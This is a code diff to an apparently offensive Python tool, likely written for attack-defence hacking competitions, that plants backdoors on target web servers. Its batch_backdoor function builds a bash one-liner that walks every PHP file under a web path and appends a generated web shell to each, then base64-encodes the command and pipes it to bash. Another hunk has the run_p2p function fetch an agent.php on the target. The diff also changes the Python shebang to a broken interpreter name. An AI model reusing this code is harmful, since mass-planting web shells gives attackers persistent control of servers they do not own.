@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env pytn
 
 from http import http
 from config import *
@@ -290,6 +290,7 @@ def batch_backdoor(target,target_port,cmd):
     shell_name,shell,shell_base64 = generate_shell(target,target_port,cmd,1)
     # We use the bash script to add the batch backdoor, because we add the bd at the end of the file, we'd better add the ?> with it
     cmd = 'function read_dir(){ for file in `ls $1`;do if [ -d $1"/"$file ];then read_dir $1"/"$file;else echo $1"/"$file;fi;done };read_dir %s | grep .php | xargs sed -i \'$a\%s\''%(web_path,"?>" + shell)
+    cmd = cmd.replace("\n",'')
     print cmd
     cmd = base64.b64encode(cmd)
     cmd = "/bin/echo %s | /usr/bin/base64 -d | /bin/bash"%cmd
@@ -309,9 +310,10 @@ def change_password(target,target_port,cmd):
 
 # This function is designed to generate and run a p2p network
 def run_p2p(target,target_port,cmd):
-    cmd = create_p2p(target,target_port,cmd)
-    agent_absolute_path = shell_absolute_path + 'agent.php'
-    cmd += ';php ' + agent_absolute_path
+    #cmd = create_p2p(target,target_port,cmd)
+    agent_path = shell_path + 'agent.php'
+    http("get",target,target_port,agent_path,'',headers)
+    cmd = ';echo "visit agent.php "'
     debug_print(cmd)
     return cmd
 
